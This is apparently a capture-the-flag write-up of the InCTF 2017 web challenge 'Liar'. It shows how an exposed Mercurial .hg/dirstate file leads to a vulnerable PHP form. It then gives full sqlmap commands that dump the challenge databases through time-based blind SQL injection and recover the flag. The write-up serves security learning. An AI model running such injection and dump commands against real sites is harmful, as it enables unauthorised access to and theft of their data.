---
layout: post
title: 'InCTF | Web Challenge: Liar'
date: '2017-12-17T03:42:00.000-08:00'
author: Keramas
tags:
- CTF challenge
modified_time: '2017-12-17T03:42:24.421-08:00'
blogger_id: tag:blogger.com,1999:blog-4206503528938574504.post-8051397922743353541
blogger_orig_url: https://k3ramas.blogspot.com/2017/12/challenge-liar-category-web-when-site.html
---

<b>Challenge:</b><br />Liar<br /><br /><b>Category</b><br />Web<br /><br /><img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/liarchallenge.png?raw=true" /><br /><br />When the site loads, there is nothing on the page except for a message that nothing is on their website--but we know, as the title of the challenge states, this is a big, fat lie.<br /><br /><img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/nothingonthesite.png?raw=true" /><br /><br />The hint tells us that the site is using some form of VCS, and after some testing, I discovered the site was using Mercurial. Based on this knowledge, I used wget to download the ".hg/dirstate" file, which is a binary file that is an information directory about the repository.<br /><br />Running strings on the file, the following was output:<br /><br /><img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/stringsondirstate.png?raw=true" /><br /><br />Nice, so now we have a directory to look at, and it seems like there is also a vulnerable PHP to work with as well. The index.html has a form to "find your friends" and this is what is running the PHP.<br /><br /><img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/findyourfriends.png?raw=true" /><br /><br />Inspecting the source code, we get a bit of a hint:<br /><br /><img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/liar_sitehint.png?raw=true" /><br /><br />So, I fired up Sqlmap to do the heavy lifting based on the data that was being passed, including name and the captcha:<br /><br />sqlmap -u "http://liar.inctf.in/1ts_h4rd_t0_gu3ss/vulnerable.php" --data="name=ron&amp;g-recaptcha-response=03AO6mBfw5nAnH7od5LVOqf7H-Yib-8E52lULt4-Zxt9dVb_j3NV6lLCf0BEAK5i3BnYLgoAradJJYGXSCPAe3OhOFJndC4eiJ2ndshWtp74YgsDO-qcfM2Iy4yvDuuCO4N_oIsZ-QtL9uqgqJseKy0ncgRT91QOL7QnKYun60O_2pSwJUN7tgXpxQjqaCzM-V064cRpAHePHKX8nUaAxvRanHQTfINRMFI9MSu1wlJnLO4GS-GD9reD2lZDqIRXJ8bGBRVBDmhtYJ2KUxPVYTMlKnS9BnrsT_eMvMIcef0ULl3-Zc4_qO81sCw0iEEEdjkNbL0PaQ72uUr8TZMH8MQR-xQ3xlNVs_VwZOGu79WeVEMtwLqfVFCONbaOJfpupzHEL17KMCemKxn3gLrNqhAe-7muUxB3EZ7iSQVQa16moJkxPOm8Hf7982" --dump-all --threads=10 --random-agent --dbms=mysql --level=5 --risk=3<br /><br />The result:<br /><br /><img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/blindtimebased.png?raw=true" /><br /><br /><img src="https://github.com/Keramas/CTF-Writeups/blob/master/Images/InCTF/trolled.png?raw=true" /><br /><br />Now when we go to dump all the databases, we get trolled. The CTF database had some leet speak in it that appeared to be the flag, but it was not. Since this is time-based, it will take a while to dump everything in information_schema (there are 61 tables), so I turned to check the mysql database first instead. Guessing a bit here, I first got the "innodb_table_stats" table and then decided to guess that a "phone" column existed in there since the hint in the source code mentioned our answer is in the phone column.<br /><br />Luckily I was correct!<br /><br />sqlmap -u "http://liar.inctf.in/1ts_h4rd_t0_gu3ss/vulnerable.php" --data="name=ron&amp;g-recaptcha-response=03AO6mBfw5nAnH7od5LVOqf7H-Yib-8E52lULt4-Zxt9dVb_j3NV6lLCf0BEAK5i3BnYLgoAradJJYGXSCPAe3OhOFJndC4eiJ2ndshWtp74YgsDO-qcfM2Iy4yvDuuCO4N_oIsZ-QtL9uqgqJseKy0ncgRT91QOL7QnKYun60O_2pSwJUN7tgXpxQjqaCzM-V064cRpAHePHKX8nUaAxvRanHQTfINRMFI9MSu1wlJnLO4GS-GD9reD2lZDqIRXJ8bGBRVBDmhtYJ2KUxPVYTMlKnS9BnrsT_eMvMIcef0ULl3-Zc4_qO81sCw0iEEEdjkNbL0PaQ72uUr8TZMH8MQR-xQ3xlNVs_VwZOGu79WeVEMtwLqfVFCONbaOJfpupzHEL17KMCemKxn3gLrNqhAe-7muUxB3EZ7iSQVQa16moJkxPOm8Hf7982" --threads=10 --random-agent --dbms=mysql --level=5 --risk=3 -D mysql -T innodb_table_stats -C phone --dump<br /><br />Though the above took quite a bit to finish, it eventually dumps out our flag:<br /><br />inctf{H0w_@b0Ut_@n_r3@L_1nJ3c}<br /><br /><br />